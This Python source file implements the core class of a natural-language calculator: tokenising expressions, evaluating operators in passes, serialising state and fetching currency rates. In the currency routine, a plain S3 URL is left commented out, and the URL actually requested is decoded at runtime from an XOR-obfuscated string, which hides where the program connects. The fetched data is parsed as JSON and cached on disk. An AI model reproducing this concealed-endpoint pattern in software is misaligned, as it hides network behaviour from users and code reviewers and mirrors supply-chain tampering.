#!/usr/bin/env python3

from .value_encode import ValueDecoder, ValueEncoder
from .operator import Operator
from .value import Value
from .modifier import Modifier
from .paren import Paren
from .convert import Convert
from .assign import Assign
from .variable import Variable
from .multiplier import Multiplier
from .multiplier_merge import MultiplierMerge
from .special_tokens import SpecialTokens
from .constant import Constant
from .token import Token
from .function import Function
from .string import String
from .commands import Commands
from .modifier_to_var import ModifierToVar
from urllib import request
import json
import base64
import os
from datetime import datetime

class Calc:
    def __init__(self, currency_override=None, date_override=None, unserialize=None):
        self.debug_mode = False
        self._level = 0
        self.variables = {}
        self.state = {}
        self._currency_override = currency_override
        self._currency_data = None
        self._date_override = os.environ.get("HC_DATE", date_override)
        if self._date_override is not None and isinstance(self._date_override, str):
            self._date_override = datetime(int(self._date_override[:4]), int(self._date_override[5:7]), int(self._date_override[8:]))
        self._displayed_state = False
        self._parse_pass = 0
        if unserialize is not None and len(unserialize) > 0:
            try:
                data = base64.b64decode(unserialize)
                data = json.loads(data, cls=ValueDecoder)
                self.variables = data.get("v", {})
                self.state = data.get("s", {})
            except:
                self.variables = {}
                self.state = {}

    def serialize(self):
        data = {}
        if len(self.variables) > 0:
            data["v"] = self.variables
        if len(self.state) > 0:
            data["s"] = self.state
        data = json.dumps(data, cls=ValueEncoder)
        data = base64.b64encode(data.encode("utf-8")).decode("utf-8")
        return data

    def _get_currency(self):
        # Helper to get currency data, and cache it locally
        if self._currency_data is None:
            if os.environ.get("HC_OVERRIDE", self._currency_override) is None:
                # No override, grab the real file
                # url = "https://hc-currency-info.s3-us-west-2.amazonaws.com/currency/data.json"
                url=''.join(chr(x^y^(i+48)) for i,(x,y) in enumerate(zip(*[iter(ord(x) for x in 
                '1i5pu3q24sVYwnum4dc9fq6nz37x5yb8ZtUwXc7YnCMfEeNf1WqK3JV0iPVhW4oWdQKiGaO17Q7L'+
                'sDlVhQSppEyLpMeOcN0AIJ68mbt8niqaymxmdiDC81EWu6ZSLCshTE9fRJ55ybTO')]*2)))

                fn = __file__ + ".currency.json"
                if os.path.isfile(fn):
                    # If the cache exists, see how old it is
                    with open(fn) as f:
                        self._currency_data = json.load(f)
                    age = (datetime.utcnow().timestamp() - self._currency_data['timestamp']) / 3600.0
                else:
                    age = None
                if age is None or age >= 120:
                    # Either there was no cache, or it's over 5 days old
                    with request.urlopen(url) as resp:
                        data = resp.read()
                    if os.environ.get("HC_CACHE", "true") == "true":
                        with open(fn, "wb") as f:
                            f.write(data)
                    self._currency_data = json.loads(data)
            else:
                # We were told to us an override file, so use it
                with open(os.environ.get("HC_OVERRIDE", self._currency_override)) as f:
                    self._currency_data = json.load(f)
        return self._currency_data

    def _parse_string(self, value):
        # Ensure that placeholder characters aren't used
        value = "".join(" " if x in Token.ALL else x for x in value)
        # Strip out special things that are pre-processed
        special = SpecialTokens()
        value = special.find_dates(value)
        value = special.find_numbers(value)

        # Hide any spaces we want to treat as part of tokens
        spaces = Modifier.get_space_tokens()
        for cur, replace in spaces.items():
            if cur.lower() in value.lower():
                x = value.lower().index(cur.lower())
                value = value[:x] + replace + value[x+len(cur):]

        value += " "
        types = [
            ('num', True, set(',.0123456789')),
            ('oper', False, set('$()*+-/:=%^&|')),
            ('oper_words', True, set('<>')),
            ('var', True, set(Token.SPACE + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz')),
            ('special', True, set(Token.SPECIAL))
        ]

        # Parse a string into tokens
        tokens = []
        lasts = []
        last_dig = ""
        cur_set = set()
        merge_set = False

        # Crack the string into different tokens
        for cur in value:
            if cur not in cur_set:
                cur_set = set()
                for _, test_merge, test_set in types:
                    if cur in test_set:
                        cur_set = test_set
                        tokens.append("")
                        lasts.append(last_dig)
                        merge_set = test_merge
                        break
            if cur in cur_set:
                tokens[-1] += cur
                if not merge_set:
                    cur_set = set()
            last_dig = cur

        # Turn the raw tokens into token objects
        tail = None
        prev_token = None
        for i in range(len(tokens)):
            prev_dig = lasts[i]
            # If the previous token is a convert token, treat
            # the previous digit as a number to allow any modifiers
            # to match
            if isinstance(tail, Convert):
                prev_dig = "0"

            # And now figure out what the token is, the order here matters
            # since we want to allow some things first
            cur = tokens[i]
            temp = None
            if temp is None and cur in special.tokens:
                if special.tokens[cur][0] == "date":
                    temp = Value.as_date(special.tokens[cur][1])
                elif special.tokens[cur][0] in {"hex", "bin", "oct"}:
                    temp = Value.as_base(special.tokens[cur][1], special.tokens[cur][0])
                else:
                    raise Exception("Unknown special token " + special.tokens[cur][0])
            if temp is None: temp = Paren.as_paren(cur)
            if temp is None: temp = Modifier.as_modifier(cur, prev_dig, prev_token)
            if temp is None: temp = Operator.as_op(cur)
            if temp is None: temp = Convert.as_convert(cur)
            if temp is None: temp = Assign.as_assign(cur)
            if temp is None: temp = Multiplier.as_multiplier(cur)
            if temp is None: temp = Constant.as_constant(cur)
            if temp is None: temp = Function.as_function(cur)
            if temp is None: temp = Variable.as_variable(cur)
            if temp is None: temp = Value.as_value(cur)
            if temp is not None:
                # We figured out what the token is, add it to
                # our linked list
                if tail:
                    tail.next, tail, temp.prev = temp, temp, tail
                else:
                    tail = temp
                prev_token = temp
        
        ret = None if tail is None else tail.get_head()
        if ret is not None:
            # Special case, if the operation starts with an operator that needs two 
            # values, like "+", "/", or "*", but not "-", then we assume a calculation 
            # is being done off of the last result
            if ret.requires_lhs():
                temp = Variable.as_variable("last")
                temp.next = ret
                ret.prev = temp
                ret = temp

        # Return the head of our linked list
        return ret

    def _dump_debug(self, cur):
        # Internal helper to dump out a debug view of the current
        # token list
        if self.debug_mode:
            tokens = []
            while cur is not None:
                tokens.append(f"{cur.get_desc()}[{cur.to_string()}]")
                cur = cur.next
            print(f"DEBUG: {' ' * (self.level * 2)}{' '.join(tokens)}")

    def _calc_nodes(self, head):
        # Internal helper to parse a list of tokens
        # This can call itself to handle some situations, so
        # track the level here, this is only used for 
        # debugging
        self.level += 1

        # The order of operations, some things will appear
        # more than once with different options to allow
        # fine grained control for that operation
        passes = [
            (Variable, None),
            (Constant, None),
            (Multiplier, None),
            (MultiplierMerge, None),
            (Paren, None),
            (Operator, Operator.STEP_MERGE_MODS),
            (Modifier, None),
            (Operator, Operator.STEP_EXPONENT),
            (Operator, Operator.STEP_NEGATE),
            (Operator, Operator.STEP_MULTIPLY),
            (Operator, Operator.STEP_ADD),
            (Operator, Operator.STEP_SHIFT),
            (Operator, Operator.STEP_AND),
            (Operator, Operator.STEP_XOR),
            (Operator, Operator.STEP_OR),
            (Function, None),
            (Convert, None),
            (Assign, None),
            (ModifierToVar, None),
        ]

        # Start off by showing the list of tokens to be run
        self._dump_debug(head)
        while head is not None:
            for parse_pass in range(2):
                self._parse_pass = parse_pass
                changed = False

                # For now this is a special case, the conversion "in" is turned into an 
                # operator "per" if it's surronded by values
                cur = head
                while cur is not None:
                    if cur.is_types(Value, Convert, Value) and cur.next.value == "in":
                        cur, head = cur.insert(Operator.as_op("/"), cur[1], cur[1])
                        self._dump_debug(head)
                    cur = cur.next
                
                # Run through each operation in turn
                for cur_pass in passes:
                    # And run through each node in the list
                    cur = head
                    while cur is not None:
                        # If this operation matches our position, and claims
                        # it can handle it, run the operation
                        static_call, dynamic_call = False, False
                        if cur_pass[0].static_only and cur_pass[0].can_handle(cur, self, cur_pass[1]):
                            static_call = True
                        elif cur.is_types(cur_pass[0]) and cur.can_handle(self, cur_pass[1]):
                            dynamic_call = True

                        if static_call or dynamic_call:
                            # The operation returns a value as the result of the 
                            # operation, and how many items on either side it needs to
                            # replace
                            try:
                                if static_call:
                                    from_ins, to_ins, temp = cur_pass[0].handle(cur, self)
                                elif dynamic_call:
                                    from_ins, to_ins, temp = cur.handle(self)
                                failure = False
                            except:
                                if self.debug_mode:
                                    raise
                                failure = True

                            if failure:
                                # Just treat errors as fatal
                                head = String(f"ERROR: In '{cur.to_string()}'")
                                cur = head
                            else:
                                # So, go ahead and replace the items we've been told to
                                cur, head = cur.insert(temp, cur[from_ins], cur[to_ins])
                            # We changed the list, so dump out the new list
                            self._dump_debug(head)
                            changed = True
                        else:
                            # Nothing happened, move on to the next node
                            cur = cur.next

                if changed:
                    # We did something, go ahead and start over
                    break

            if not changed:
                # We got through all of the passes without doing
                # anything, call it quits, it won't get better
                break

        self.level -= 1
        return head

    def calc(self, value):
        # If we only display the state, we want to avoid updating the state
        self._displayed_state = False

        # First off see if this is a calculator command
        ret = Commands.handle(value, self)
        if ret is not None:
            return ret

        # Main interface to calculate a string
        # Crack the string into tokens
        head = self._parse_string(value)

        if head is None:
            # No tokens?  Nothing to do then
            return None

        # Calculate the tokens
        self.level = -1
        ret = self._calc_nodes(head)

        # If the only thing left is a variable, and we know
        # the value, go ahead and decode it
        if ret is not None and ret.next is None:
            if ret.is_types(Variable):
                if ret.value in self.variables:
                    ret = self.variables[ret.value].clone()

        # If all of the parsing return exactly on token
        # save a copy of the results to the magic "last" variable
        if ret is not None and ret.next is None:
            self.state["last"] = ret.clone()

        # And if it's a value token, add it to the running total
        if ret is not None and ret.next is None and isinstance(ret, Value):
            if not self._displayed_state:
                if isinstance(ret.value, float):
                    self.state["count"] = self.state.get("count", 0) + 1
                    self.state["sum"] = self.state.get("sum", 0) + ret.value

        # Return the list to whoever called us
        return ret
